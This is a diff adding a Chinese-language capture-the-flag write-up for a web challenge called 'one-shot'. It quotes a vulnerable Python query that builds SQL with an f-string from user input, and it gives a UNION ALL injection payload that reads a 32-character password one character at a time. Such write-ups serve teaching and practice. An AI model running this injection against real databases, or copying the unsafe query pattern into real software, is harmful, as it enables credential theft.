@@ -55,6 +55,17 @@ BANNED = ['import', 'class', 'Main', '{', '}']
 
 # web
 ### one-shot
+流程,new_session生成一个表(随机密码),search来匹配这个表里的字符且只能search一次,guess需要输入密码
+```python
+    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
+```
+search的query参数存在sql注入
+```bash
+' UNION ALL SELECT substr(password, 1, 1) FROM table_id UNION ALL SELECT substr(password, 2, 1) FROM table_id UNION ALL SELECT substr(password, 3, 1) FROM table_id UNION ALL SELECT substr(password, 4, 1) FROM table_id UNION ALL SELECT substr(password, 5, 1) FROM table_id UNION ALL SELECT substr(password, 6, 1) FROM table_id UNION ALL SELECT substr(password, 7, 1) FROM table_id UNION ALL SELECT substr(password, 8, 1) FROM table_id UNION ALL SELECT substr(password, 9, 1) FROM table_id UNION ALL SELECT substr(password, 10, 1) FROM table_id UNION ALL SELECT substr(password, 11, 1) FROM table_id UNION ALL SELECT substr(password, 12, 1) FROM table_id UNION ALL SELECT substr(password, 13, 1) FROM table_id UNION ALL SELECT substr(password, 14, 1) FROM table_id UNION ALL SELECT substr(password, 15, 1) FROM table_id UNION ALL SELECT substr(password, 16, 1) FROM table_id UNION ALL SELECT substr(password, 17, 1) FROM table_id UNION ALL SELECT substr(password, 18, 1) FROM table_id UNION ALL SELECT substr(password, 19, 1) FROM table_id UNION ALL SELECT substr(password, 20, 1) FROM table_id UNION ALL SELECT substr(password, 21, 1) FROM table_id UNION ALL SELECT substr(password, 22, 1) FROM table_id UNION ALL SELECT substr(password, 23, 1) FROM table_id UNION ALL SELECT substr(password, 24, 1) FROM table_id UNION ALL SELECT substr(password, 25, 1) FROM table_id UNION ALL SELECT substr(password, 26, 1) FROM table_id UNION ALL SELECT substr(password, 27, 1) FROM table_id UNION ALL SELECT substr(password, 28, 1) FROM table_id UNION ALL SELECT substr(password, 29, 1) FROM table_id UNION ALL SELECT substr(password, 30, 1) FROM table_id UNION ALL SELECT substr(password, 31, 1) FROM table_id UNION ALL SELECT substr(password, 32, 1) FROM table_id ; --
+```
+返回所有password
+
+
 # reverse
 
 # pwn
